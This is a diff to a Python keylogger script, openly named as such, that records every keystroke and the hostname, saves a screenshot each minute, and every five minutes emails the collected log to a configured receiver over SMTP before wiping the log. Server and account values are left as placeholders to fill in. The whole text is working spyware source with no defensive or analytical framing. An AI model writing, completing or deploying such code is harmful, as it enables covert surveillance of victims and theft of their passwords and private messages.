@@ -18,12 +18,14 @@ sys_info = []
 fucking_keys = []
 
 
-keyloger_files_location = "#######"  #------> Change here
-os.system('touch {}/logs.txt'.format(keyloger_files_location))
-log_file = '{}/logs.txt'.format(keyloger_files_location)
-EMAIL_SENDER = '##########'  #------> Change here
-EMAIL_PASSWORD = '#########'  #------> Change here
+keyloger_files_location = "###########"  #------> Change here
+EMAIL_SENDER = '###########'  #------> Change here
+EMAIL_PASSWORD = '#########*'  #------> Change here
 EMAIL_RECEIVER = '#########'  #------> Change here
+log_file = "{}/logs.txt".format(keyloger_files_location)
+
+
+
 
 def get_info():
     hostname = socket.gethostname()
@@ -41,7 +43,7 @@ def get_info():
 
 logging.basicConfig(filename=(log_file), level=logging.DEBUG, format=" %(message)s" )
 
-def on_press(key):
+def on_press(key): # --------> WILL BE UPDATE
     if str(key) != 'Key.enter':
         fucking_keys.append(str(key).strip("'"))
     else:
@@ -49,17 +51,20 @@ def on_press(key):
         logging.info(str(fucking_keys))
         fucking_keys.clear()
 
+
+
+
 def screenshot():
     ss = 0 
     while True: 
         myScreenshot = pyautogui.screenshot()
-        myScreenshot.save('#######/{}.png'.format(str(ss)))  #------> Change here
-        time.sleep(60)
+        myScreenshot.save('{}/{}.png'.format(keyloger_files_location,str(ss))) 
+        time.sleep(60) # --------------> SCREENSHOT TIME
         ss+=1
 
 def send():
     while True:
-        time.sleep(300)
+        time.sleep(300) # ----------------> EMAIL SEND TIME 
         SUBJECT = 'Just Mail'
         with open(log_file , 'r') as f:
             readed_content = f.read()
@@ -74,10 +79,11 @@ def send():
 
         context = ssl.create_default_context()
 
-        with smtplib.SMTP_SSL('#####', 465,context=context) as smtp: #------> Change here
+        with smtplib.SMTP_SSL('##########', 465,context=context) as smtp: #------> Change here
             smtp.login(EMAIL_SENDER ,EMAIL_PASSWORD)
             smtp.sendmail(EMAIL_SENDER ,EMAIL_RECEIVER ,em.as_string())
-            fucking_keys.clear()
+        f = open(log_file, 'r+')
+        f.truncate(0)
 
 def fucking_listener():        
     while True:
